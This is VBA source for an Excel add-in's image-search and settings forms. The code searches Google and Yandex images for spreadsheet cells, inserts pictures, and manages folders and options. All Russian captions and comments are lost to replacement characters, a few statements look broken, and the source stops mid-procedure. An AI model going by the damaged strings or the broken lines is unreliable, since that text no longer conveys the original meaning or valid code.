    On Error Resume Next: Err.Clear
    Me.CommandButton_PrevCell.Enabled = True
    Me.CommandButton_NextCell.Enabled = True
    AutoInsertMode = False
    Me.CommandButton_AutoInsertFirstImage.Caption = Me.CommandButton_AutoInsertFirstImage.Tag
End Sub


Private Sub CheckBox_FI_AnyImageSize_Click()
    On Error Resume Next: Err.Clear
    Dim ctrl As Control
    For Each ctrl In Me.Frame_PicSize.Controls
        If Not ctrl.name Like "*CheckBox_FI_AnyImageSize*" Then
            ctrl.Enabled = Not Me.CheckBox_FI_AnyImageSize.Value
        End If
    Next
End Sub

Private Sub CommandButton_NextCell_Click()
    On Error Resume Next:
    If Me.CellsWithoutPictures.Cells.Count > 1 Then
        Me.CWP_index = Me.CWP_index + 1
        PrepareForSearch
    Else
        Err.Clear: Set Me.CellsWithoutPictures = Me.CurrentCell.Offset(1)
        If Err Then Me.CommandButton_NextCell.Enabled = False: Exit Sub
        PrepareForSearch True
    End If
    Me.CommandButton_StartSearch.SetFocus
End Sub

Private Sub CommandButton_PrevCell_Click()
    On Error Resume Next:
    If Me.CellsWithoutPictures.Cells.Count > 1 Then
        Me.CWP_index = Me.CWP_index - 1
        PrepareForSearch
    Else
        Err.Clear: Set Me.CellsWithoutPictures = Me.CurrentCell.Offset(-1)
        If Err Then Me.CommandButton_PrevCell.Enabled = False: Exit Sub
        PrepareForSearch True
    End If
    Me.CommandButton_StartSearch.SetFocus
End Sub

Private Sub CommandButton_Quit_Click()
    On Error Resume Next: Unload Me
End Sub

Sub CommandButton_StartSearch_Click()
    On Error Resume Next: Err.Clear
    Dim coll As Collection, FI As FoundImage, im As MSForms.Image

    count_W& = SETT.GetNumber("ComboBox_FI_count_W", 6)
    count_H& = SETT.GetNumber("ComboBox_FI_count_H", 3)

    If AutoInsertMode Then count_W& = 1: count_H& = 1

    ClearSearchResults
    Me.Frame_Results.Caption = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."

    If SETT.GetBoolean("CheckBox_FI_UseIE") Then
        Set coll = GetGooglePictures(Me.TextBox_Query, count_W& * count_H&, Me.IE)
    Else
        Set coll = GetGooglePicturesNew2(Me.TextBox_Query, count_W& * count_H&)
    End If


    cnt_FI_queries& = cnt_FI_queries& + 1
    If coll.Count Then
        cnt_FI_queriesOK& = cnt_FI_queriesOK& + 1
        AddSearchResults coll
        Me.Label_HelpMessage.Visible = Me.CurrentCell.ID = ""
        If AutoInsertMode Then
            item_index& = 1
            Set FI = coll.Item(1)
            'FI.Image_MouseUp 1, 0, -1, -1

            While (FI.AutoInsertImage = False) And (item_index& < Application.Min(5, coll.Count))
                item_index& = item_index& + 1
                Set FI = coll.Item(item_index&)
            Wend
        End If
    Else
        Me.Frame_Results.Caption = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End If
End Sub

Sub AddSearchResults(Optional ByRef coll As Collection)
    On Error Resume Next: Err.Clear
    Dim FI As FoundImage, im As MSForms.Image, ind&
    With Me.Frame_Results
        .Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:"
        .BorderStyle = fmBorderStyleSingle
    End With
    currentIndex& = Me.CWP_index

    count_W& = SETT.GetNumber("ComboBox_FI_count_W", 6)
    count_H& = SETT.GetNumber("ComboBox_FI_count_H", 3)
    margin& = SETT.GetNumber("ComboBox_FI_margin", 10)

    Const FramePadding& = 7
    im_h& = (Me.Frame_Results.Height - FramePadding& * 3 - margin& * (count_H& - 1)) / count_H&
    im_w& = (Me.Frame_Results.Width - FramePadding& * 3 - margin& * (count_W& - 1)) / count_W&

    If coll Is Nothing Then
        ClearSearchResults
        Me.Frame_Results.Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:"
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        PicInd_1& = LastPicInd& + 1
        PicInd_2& = PicInd_1& + count_W& * count_H&
        Set coll = FI_Collection
        LastPicInd& = PicInd_2&
    Else
        PicInd_1& = 1
        PicInd_2& = count_W& * count_H&
        LastPicInd& = count_W& * count_H&
    End If

    For i = PicInd_1& To PicInd_2&
        Set FI = Nothing: Set FI = coll(i)
        If currentIndex& <> Me.CWP_index Then Exit Sub
        If Not FI Is Nothing Then
            Set im = Me.Frame_Results.Controls.Add("Forms.Image.1")
            Set FI.Image = im
            Set FI.F = Me

            ind& = ind& + 1
            im_row& = (ind& - 1) \ count_W&
            im_col& = (ind& - 1) Mod count_W&
            im.Top = FramePadding& + (margin& + im_h&) * im_row&
            im.Left = FramePadding& + (margin& + im_w&) * im_col&
            im.Width = im_w&
            im.Height = im_h&
            im.BorderColor = 8421504
            im.PictureSizeMode = fmPictureSizeModeZoom
            im.SpecialEffect = fmSpecialEffectRaised

            If currentIndex& <> Me.CWP_index Then Exit Sub
            If FI.DownloadPreview Then FI.Show: DoEvents
        End If
    Next
    If LastPicInd& < coll.Count Then Me.Label_AddModeResults.Visible = True
    Set FI_Collection = coll
End Sub

Sub ClearSearchResults()
    On Error Resume Next: Err.Clear
    Dim ctrl As Control
    For Each ctrl In Me.Frame_Results.Controls
        If ctrl.name Like "*Image*" Then Me.Controls.Remove ctrl.name
    Next
    With Me.Frame_Results
        .Caption = ""
        .BorderStyle = fmBorderStyleNone
    End With
    Me.Label_AddModeResults.Visible = False
End Sub

Private Sub CommandButton_SaveSettings_Click()
    On Error Resume Next
    SETT.SaveAllFromSettingForm Me

    Me.MultiPage1.Value = 0
    Me.CommandButton_StartSearch.SetFocus
    PrepareForSearch
End Sub

Sub Frame_Results_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal y As Single)
    On Error Resume Next: Err.Clear

    F_Preview.Hide
    If Not Me.Label_HelpMessage.Visible Then
        If Not Me.Image_Preview.Picture Is CurrentPicture Then
            Set Me.Image_Preview.Picture = CurrentPicture
            Me.Frame_CurrentImageActions.Visible = Not (CurrentPicture Is Nothing)
            Me.Label_HelpMessage.Visible = (CurrentPicture Is Nothing)
        End If
        Me.Label_FIH = "": Me.Label_FIW = "": Me.Label_PrewiewSize = ""
        Me.Label_FI_fromWebsite = "": Me.Label_FI_SearchProvider = ""
    End If

    If Not ActiveFoundImage Is Nothing Then
        ActiveFoundImage.BorderColor = 8421504
        ActiveFoundImage.SpecialEffect = fmSpecialEffectRaised
        DoEvents
    End If
    Set ActiveFoundImage = Nothing
End Sub


Private Sub Frame_SelectedImage_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal y As Single)
    On Error Resume Next: Frame_Results_MouseMove Button, Shift, X, y
End Sub

Private Sub Label_AddModeResults_Click()
    On Error Resume Next: AddSearchResults
End Sub

Private Sub Label_HelpMessage_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal y As Single)
    On Error Resume Next: Frame_Results_MouseMove Button, Shift, X, y
End Sub

Private Sub Label__BrowseCurrentImage_Click()
    On Error Resume Next: Err.Clear
    If Me.CurrentCell.ID <> "" Then ShowFile Me.CurrentCell.ID
End Sub


Private Sub Label_OpenCurrentImage_Click()
    On Error Resume Next: Err.Clear
    If Me.CurrentCell.ID <> "" Then CreateObject("wscript.shell").Run """" & Me.CurrentCell.ID & """"
End Sub
Private Sub Label_RemoveCurrentImage_Click()
    On Error Resume Next: Err.Clear
    If Me.CurrentCell.ID <> "" Then
        ' removing old picture
        Application.ScreenUpdating = False
        VerticalCellsCount& = Fix(Val(SETT.GetNumber("ComboBox_CELLScount"))): If VerticalCellsCount& <= 0 Then VerticalCellsCount& = 1
        ShapesInRange(Me.CurrentCell.EntireRow.Cells(PICTURE_COLUMN(Me.CurrentCell)).Resize(VerticalCellsCount&)).Delete
        If Not SETT.GetBoolean("CheckBox_KeepRowsHeightAfterDeleting") Then Me.CurrentCell.EntireRow.AutoFit

        Set CurrentPicture = Nothing
        Set Me.Image_Preview.Picture = Nothing
        Me.Label_HelpMessage.Visible = True
        Me.Frame_CurrentImageActions.Visible = 0

        Application.ScreenUpdating = True
        Kill Me.CurrentCell.ID
        Me.CurrentCell.ID = ""
    End If
End Sub

Private Sub Label_ShowCellsSettings_Click()
    On Error Resume Next
    hl$ = DEVELOPER_WEBSITE$ & "programmes/PastePictures/SearchImages?ref=" & HID$
    CreateObject("wscript.Shell").Run hl$
End Sub

Private Sub Label_ViewGoogle_Click()
    On Error Resume Next: Err.Clear
    sURL_1$ = "http://www.google.ru/search?q="
    sURL_2$ = "&hl=ru&newwindow=1&safe=off&tbo=d&source=lnms&tbm=isch"
    sURL$ = RussianStringToURLEncode_New(Trim(Me.TextBox_Query))

    CreateObject("wscript.Shell").Run sURL_1$ & sURL$ & sURL_2$
End Sub

Private Sub Label_ViewYandex_Click()
    On Error Resume Next: Err.Clear
    sURL_1$ = "http://images.yandex.ru/yandsearch?text="
    sURL_2$ = ""
    sURL$ = RussianStringToURLEncode_New(Trim(Me.TextBox_Query))

    CreateObject("wscript.Shell").Run sURL_1$ & sURL$ & sURL_2$
End Sub


Private Sub MultiPage1_Change()
    On Error Resume Next: Err.Clear
    Select Case Me.MultiPage1.Value
        Case 0
            Me.CommandButton_SaveSettings.Visible = False
            Me.CommandButton_AutoInsertFirstImage.Visible = True
            Me.CommandButton_NextCell.Visible = True
            Me.CommandButton_PrevCell.Visible = True
        Case Else
            Me.CommandButton_SaveSettings.Visible = True
            Me.CommandButton_AutoInsertFirstImage.Visible = False
            Me.CommandButton_NextCell.Visible = False
            Me.CommandButton_PrevCell.Visible = False
    End Select
End Sub

Private Sub SpinButton_FI_H_min_Change()
    On Error Resume Next: Me.Label_FI_H_min = Me.SpinButton_FI_H_min
    If Me.SpinButton_FI_H_max < Me.SpinButton_FI_H_min Then Me.SpinButton_FI_H_max = Me.SpinButton_FI_H_min
End Sub
Private Sub SpinButton_FI_W_min_Change()
    On Error Resume Next: Me.Label_FI_W_min = Me.SpinButton_FI_W_min
    If Me.SpinButton_FI_W_max < Me.SpinButton_FI_W_min Then Me.SpinButton_FI_W_max = Me.SpinButton_FI_W_min
End Sub
Private Sub SpinButton_FI_H_max_Change()
    Me.Label_FI_H_max = Me.SpinButton_FI_H_max
End Sub
Private Sub SpinButton_FI_W_max_Change()
    Me.Label_FI_W_max = Me.SpinButton_FI_W_max
End Sub

Private Sub TextBox_Query_Change()
    On Error Resume Next: Err.Clear
    Me.Frame_OpenInBrowser.Visible = Len(Trim(Me.TextBox_Query)) > 0
End Sub

Private Sub TextBox_Query_KeyDown(ByVal KeyCode As MSForms.ReturnInteger, ByVal Shift As Integer)
    On Error Resume Next: Err.Clear
    If KeyCode = 13 Then
        Me.CommandButton_StartSearch.SetFocus
        Me.CommandButton_StartSearch_Click
    End If
End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next: Err.Clear

    For i = 1 To 50
        Me.ComboBox_FI_URL_Column.AddItem ColumnNameByColumnNumber(i)
    Next

    For i = 5 To 30
        Me.ComboBox_PrewiewZoom.AddItem Format(i / 10, "0.0")
    Next
    If Val(Replace(SETT.GetNumber("ComboBox_PrewiewZoom", 0), ",", ".")) <= 0 Then SETT.SetText "ComboBox_PrewiewZoom", "2,0"

    For i = 1 To 30: Me.ComboBox_FI_margin.AddItem i: Next
    For i = 1 To 5: Me.ComboBox_FI_count_H.AddItem i: Next
    For i = 1 To 10: Me.ComboBox_FI_count_W.AddItem i: Next

    SETT.LoadIntoSettingForm Me
    TranslateUserForm Me

    Me.MultiPage1.Value = 1: Me.MultiPage1.Value = 0

    Ftop& = SETT.GetNumber("FI_Form_Top", 0)
    Fleft& = SETT.GetNumber("FI_Form_Left", 0)
    If Ftop& + Fleft& > 0 Then
        Me.Top = Ftop&: Me.Left = Fleft&: Me.StartUpPosition = 0
    End If

    If SETT.GetBoolean("CheckBox_FI_UseIE") Then Set Me.IE = CreateObject("InternetExplorer.Application")
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next: Err.Clear
    If Not IE Is Nothing Then Me.Caption = "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|...": IE.Quit: Set IE = Nothing
    Unload F_Preview
    SETT.SetText "FI_Form_Top", Me.Top
    SETT.SetText "FI_Form_Left", Me.Left

    cnt_FI_cells& = Me.CellsWithoutPictures.Cells.Count
End Sub

Sub AutoGotoNext()
    On Error Resume Next: Err.Clear
    If Not SETT.GetBoolean("CheckBox_FI_AutoGotoNext") Then
        If Me.CurrentCell.ID <> "" Then
            Set CurrentPicture = LoadPicture(Me.CurrentCell.ID)
            Set Me.Image_Preview.Picture = CurrentPicture
            Me.Label_HelpMessage.Visible = False
            Me.Frame_CurrentImageActions.Visible = Not (CurrentPicture Is Nothing)
        End If
        Exit Sub
    End If

    If Me.CommandButton_NextCell.Enabled And Me.CellsWithoutPictures.Cells.Count > 1 Then
        Me.CWP_index = Me.CWP_index + 1
        Me.Label_HelpMessage.Visible = True
        Set CurrentPicture = Nothing
        Me.Frame_CurrentImageActions.Visible = 0
        PrepareForSearch
    Else
        ' MsgBox "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!", vbInformation, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
    End If
End Sub

Sub PrepareForSearch(Optional ByVal FindAllPictureInFolder As Boolean = False)
    On Error Resume Next: Err.Clear
    Static PicCollection As Collection        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| FindAllPictureInFolder=true

    ccount& = Me.CellsWithoutPictures.Cells.Count
    Me.CommandButton_AutoInsertFirstImage.Enabled = ccount& > ll

    If Not AutoInsertMode Then
        Me.CommandButton_PrevCell.Enabled = True
        Me.CommandButton_NextCell.Enabled = True

        If Not (ccount& = 1 And FindAllPictureInFolder) Then
            If Me.CWP_index = 1 Then Me.CommandButton_PrevCell.Enabled = False
            If Me.CWP_index = ccount& Then Me.CommandButton_NextCell.Enabled = False
        End If
    End If

    Dim cell As Range, n&        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| N-|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    For Each cell In CellsWithoutPictures.Cells
        n = n + 1: If Me.CWP_index = n Then Set Me.CurrentCell = cell: Exit For
    Next cell

    Application.GoTo Me.CurrentCell.EntireRow

    If FindAllPictureInFolder And Me.CurrentCell.ID = "" Then
        If PicCollection Is Nothing Then Set PicCollection = FilenamesCollection(PICTURES_FOLDER$, "*")
        picture_filename$ = GetPicturePathForCell(Me.CurrentCell, PicCollection)
        If Len(picture_filename$) Then Me.CurrentCell.ID = picture_filename$
    End If

    If Me.CurrentCell.ID = "" Then
        Set CurrentPicture = Nothing
    Else
        Set CurrentPicture = LoadPicture(Me.CurrentCell.ID)
    End If

    Set Me.Image_Preview.Picture = CurrentPicture
    Me.Label_HelpMessage.Visible = Me.CurrentCell.ID = ""
    Me.Frame_CurrentImageActions.Visible = Not (CurrentPicture Is Nothing)

    Me.TextBox_Query = RenderQuery(Me.CurrentCell)
    Me.Label_CellInfo = "(|fffd||fffd||fffd||fffd||fffd||fffd| " & Me.CWP_index & " |fffd||fffd| " & ccount& & ")"
    ClearSearchResults
    Me.Repaint
    If SETT.GetBoolean("CheckBox_FI_AutoSearchRun") Or AutoInsertMode Then Me.CommandButton_StartSearch_Click
End Sub
Attribute VB_Name = "F_Settings"
Attribute VB_Base = "0{9B278B6E-591F-4004-B367-3F819E006659}{8D1D7FCE-6748-4F25-8327-FDEB97C9594A}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_Settings                    Version:
' Author        : Igor Vakhnenko                   Date: 03.05.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Explicit
Dim SpecialControlsCollection As Collection

Private Sub CommandButton_Quit_Click()
    Unload Me
End Sub

Private Sub CommandButton_ResetAllSettings_Click()
    On Error Resume Next
    If MsgBox(tt("ResetAllSettings_MessageText"), vbQuestion + vbOKCancel + vbDefaultButton2, tt("ResetAllSettings_MessageTitle")) = vbCancel Then Exit Sub
    DeleteSetting PROJECT_NAME$, "Settings"
    SaveDefaultSettings

    RunWithDelay "ShowSettingsPage", 0.3
    Unload Me
End Sub

Private Sub Image_ExportSettings_Click()
    ExportSettings
End Sub

Private Sub Image_ImportSettings_Click()
    If Not ImportSettings Then Exit Sub
    RunWithDelay "ShowSettingsPage", 0.3
    Unload Me
End Sub

Private Sub CommandButton_SaveSettings_Click()
    On Error Resume Next
    SETT.SaveAllFromSettingForm Me
    '    If NeedUpdateToolbar Then UpdateAddinToolbar
    Unload Me
End Sub

Private Sub CheckBox_Add_ImagesCount_Click()
    Me.ComboBox_ImagesCountColumn.Enabled = Me.CheckBox_Add_ImagesCount.Value
End Sub

Private Sub CheckBox_Add_ImageSizeNew_Click()
    Me.ComboBox_ImageSizeNewColumn.Enabled = Me.CheckBox_Add_ImageSizeNew.Value
End Sub

Private Sub CheckBox_Add_ImageSizeOriginal_Click()
    Me.ComboBox_ImageSizeOriginalColumn.Enabled = Me.CheckBox_Add_ImageSizeOriginal.Value
End Sub

Private Sub CheckBox_Add_ImageFilename_Click()
    Me.ComboBox_ImageFilenameColumn.Enabled = Me.CheckBox_Add_ImageFilename.Value
End Sub


Private Sub CheckBox_AddHyperlinks_Click()
    On Error Resume Next
    Me.CheckBox_AddHyperlinks.Font.Bold = Me.CheckBox_AddHyperlinks.Value
    Me.ComboBox_HyperlinksColumn.Enabled = Me.CheckBox_AddHyperlinks.Value
End Sub

Private Sub CheckBox_AddHyperlinksForPictures_Click()
    On Error Resume Next: Me.CheckBox_AddHyperlinksForPictures.Font.Bold = Me.CheckBox_AddHyperlinksForPictures.Value
End Sub

Private Sub CheckBox_AdjustRowHeight_Click()
    Me.CheckBox_FixedRowHeight.Enabled = Me.CheckBox_AdjustRowHeight
End Sub

Private Sub CheckBox_Cells_Click()
    On Error Resume Next: Me.ScrollBar_PicturesColumn.Enabled = Me.CheckBox_Cells
    Me.ComboBox_PicturesColumn.Enabled = Me.CheckBox_Cells: Me.CheckBox_Cells.Font.Bold = Me.CheckBox_Cells
End Sub
Private Sub CheckBox_Comments_Click()
    On Error Resume Next: Me.ScrollBar_CommentsColumn.Enabled = Me.CheckBox_Comments
    Me.ComboBox_CommentsColumn.Enabled = Me.CheckBox_Comments: Me.CheckBox_Comments.Font.Bold = Me.CheckBox_Comments
End Sub

Private Sub CheckBox_ChangeHyperlink_Click()
    On Error Resume Next: Me.TextBox_HyperlinkMask.Enabled = Me.CheckBox_ChangeHyperlink
End Sub


Private Sub CheckBox_CreateURLfromCellText_Click()
    On Error Resume Next: Err.Clear
    Me.TextBox_URL_prefix.Enabled = Me.CheckBox_CreateURLfromCellText.Value
    Me.TextBox_URL_suffix.Enabled = Me.CheckBox_CreateURLfromCellText.Value
    Me.Label_URL_prefix.Enabled = Me.CheckBox_CreateURLfromCellText.Value
    Me.Label_URL_suffix.Enabled = Me.CheckBox_CreateURLfromCellText.Value
End Sub

Private Sub CheckBox_FixedImageHeight_Click(): Select2of3options: End Sub
Private Sub CheckBox_FixedImageWidth_Click(): Select2of3options: End Sub
Private Sub CheckBox_LockAspectRatio_Click(): Select2of3options: End Sub

Sub Select2of3options()
    On Error Resume Next: Err.Clear: Dim s&, arr, CB As Variant
    s& = Abs(Me.CheckBox_LockAspectRatio + Me.CheckBox_FixedImageHeight + Me.CheckBox_FixedImageWidth)
    If Err Then Exit Sub
    On Error GoTo 0
    arr = Array(Me.CheckBox_LockAspectRatio, Me.CheckBox_FixedImageHeight, Me.CheckBox_FixedImageWidth)
    Select Case s&
        Case 0, 1
            For Each CB In arr: CB.Enabled = True: Next
        Case 2
            For Each CB In arr: CB.Enabled = CB.Value: Next
        Case 3
            SETT.SetText "CheckBox_LockAspectRatio", True
            SETT.SetText "CheckBox_FixedImageHeight", False
            SETT.SetText "CheckBox_FixedImageWidth", False
            Me.CheckBox_FixedImageHeight.Value = False
            Me.CheckBox_FixedImageWidth.Value = False
    End Select
End Sub

Private Sub CheckBox_MultiColumns_Click()
    On Error Resume Next
    Me.Frame_SourceColumns.Visible = Me.CheckBox_MultiColumns
    Me.Frame_SourceRange.Visible = Not Me.CheckBox_MultiColumns
    Me.Label_FillColumnsList.Visible = Me.CheckBox_MultiColumns
    If Me.TextBox_ColumnsList = "" Then
        Dim FirstCellAddress$, col&
        FirstCellAddress$ = SETT.GetText("TextBox_FirstCell", DEFAULT_FIRST_CELL$)
        col& = shtr.Range(FirstCellAddress$).Column
        If col& Then Me.TextBox_ColumnsList = col& & ", " Else Me.TextBox_ColumnsList = 2
    End If
End Sub

Private Sub CheckBox_OutputFilenamesFromSubfolder_Change()
    On Error Resume Next
    Me.ComboBox_SubfolderNameColumn.Enabled = Me.CheckBox_OutputFilenamesFromSubfolder.Value
    Me.ComboBox_SubfolderFilenamesFirstColumn.Enabled = Me.CheckBox_OutputFilenamesFromSubfolder.Value
End Sub

Private Sub CheckBox_RenameDownloadedPictures_Click()
    On Error Resume Next: Me.ComboBox_DownloadedFilenames_Column.Enabled = Me.CheckBox_RenameDownloadedPictures.Value
    Me.ScrollBar_DownloadedFilenames_Column.Enabled = Me.CheckBox_RenameDownloadedPictures.Value
End Sub

Private Sub CheckBox_SelectedCellsOnly_Click()
    On Error Resume Next
    Me.TextBox_FirstCell.Enabled = Not Me.CheckBox_SelectedCellsOnly.Value
    Me.CommandButton_SelectFirstCell.Enabled = Not Me.CheckBox_SelectedCellsOnly.Value
    Me.CheckBox_SelectedCellsOnly.Font.Bold = Me.CheckBox_SelectedCellsOnly.Value
End Sub

Private Sub CheckBox_ShowFolderInfo_Click()
    If Me.CheckBox_ShowFolderInfo Then CheckFolder
End Sub

Private Sub CheckBox_UseCurrentFolder_Click()
    On Error Resume Next
    SETT.SetText "CheckBox_UseCurrentFolder", Me.CheckBox_UseCurrentFolder
    Dim UseCurrentFolder As Boolean: UseCurrentFolder = SETT.GetBoolean("CheckBox_UseCurrentFolder")
    Me.TextBox_PicturesFolder = PICTURES_FOLDER$(True)
    Me.CommandButton_ChangePicturesFolder.Enabled = Not UseCurrentFolder
    Me.TextBox_PicturesFolder.Enabled = Not UseCurrentFolder
End Sub

Private Sub CheckBox_UseCurrentFolder2_Click()
    On Error Resume Next
    SETT.SetText "CheckBox_UseCurrentFolder2", Me.CheckBox_UseCurrentFolder2
    Dim UseCurrentFolder As Boolean: UseCurrentFolder = SETT.GetBoolean("CheckBox_UseCurrentFolder2")
    Me.TextBox_DownloadFolder = DOWNLOAD_FOLDER$(True)
    Me.CommandButton_ChangeDownloadFolder.Enabled = Not UseCurrentFolder
    Me.TextBox_DownloadFolder.Enabled = Not UseCurrentFolder
End Sub


Private Sub CommandButton_ChangeDownloadFolder_Click()
    On Error Resume Next: Dim folder$
    folder$ = GetFolderPath(tt("DIALOG_Select_PD_Folder_Caption"), DOWNLOAD_FOLDER$)
    If folder$ = "" Then Exit Sub
    Me.TextBox_DownloadFolder = folder$
End Sub

Private Sub CommandButton_ChangePicturesFolder_Click()
    On Error Resume Next: Dim folder$
    folder$ = GetFolderPath(tt("DIALOG_Select_PicFolder_Caption"), PICTURES_FOLDER$)
    If folder$ = "" Then Exit Sub
    Me.TextBox_PicturesFolder = folder$
    If Me.CheckBox_ShowFolderInfo Then CheckFolder
End Sub

Private Sub CommandButton_ChangeReducedFolder_Click()
    On Error Resume Next: Err.Clear: Dim folder$
    folder$ = GetFolderPath(tt("DIALOG_Select_ReducedFolder_Caption"), REDUCED_FOLDER$)
    If folder$ = "" Then Exit Sub
    Me.TextBox_ReducedFolder = folder$
End Sub

Private Sub CommandButton_SelectColumns_Click()
    On Error Resume Next
    Dim cell As Range, ra As Range, msg$, addr$
    If ActiveSheet Is Nothing Then Workbooks.Add
    msg = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| CTRL, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
          "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, " & vbNewLine & _
          "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
    Set cell = Application.InputBox(msg, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , , , , , 8)
    If Not cell Is Nothing Then
        Set ra = Intersect(cell.EntireColumn, cell.EntireColumn, cell.Worksheet.Rows(1))
        For Each cell In ra.Cells
            addr$ = addr$ & ", " & cell.Column
        Next cell
        Me.TextBox_ColumnsList = Mid(addr$, 3)
    End If
End Sub

Private Sub CommandButton_URL_Formula_Calculate_Click()
    On Error Resume Next: Dim res$
    res = EvaluateUsingFormula(ActiveCell, Me.TextBox_URL_Formula)
    MsgBox res, vbInformation, tt("MSG_FormulaResult_Caption")        ' & Me.TextBox_URL_Formula
End Sub

Private Sub Label_FillColumnsList_Click()
    On Error Resume Next: Me.MultiPage_Options.Value = 0
    Me.TextBox_ColumnsList.SetFocus
End Sub

Private Sub Label_OpenDownloadFolder_Click()
    On Error Resume Next: Dim msg$
    If SETT.GetBoolean("CheckBox_UseCurrentFolder2") Then
        If DOWNLOAD_FOLDER$ = "" Then
            msg$ = tt("MSG_UseCurrentFolder_Error_NoOpenedWBs", tt("CONST_PD_FOLDER"))
            MsgBox msg, vbExclamation, tt("FolderNotFound")
            Exit Sub
        End If
        If ActiveWorkbook.Path = "" Then
            msg$ = tt("MSG_UseCurrentFolder_Error_UnsavedWB", tt("CONST_PD_FOLDER"), ActiveWorkbook.name)
            MsgBox msg, vbExclamation, tt("FolderNotFound")
            Exit Sub
        End If
    End If

    If Dir(DOWNLOAD_FOLDER$, vbDirectory) = "" Then DOWNLOAD_FOLDER$ , True
    FWF.OpenFolder DOWNLOAD_FOLDER$
End Sub

Private Sub Label_OpenPicturesFolder_Click()
    On Error Resume Next: Dim msg$
    If SETT.GetBoolean("CheckBox_UseCurrentFolder") Then
        If PICTURES_FOLDER$ = "" Then
            msg$ = tt("MSG_UseCurrentFolder_Error_NoOpenedWBs", tt("CONST_Pic_FOLDER"))
            MsgBox msg, vbExclamation, tt("FolderNotFound")
            Exit Sub
        End If
        If ActiveWorkbook.Path = "" Then
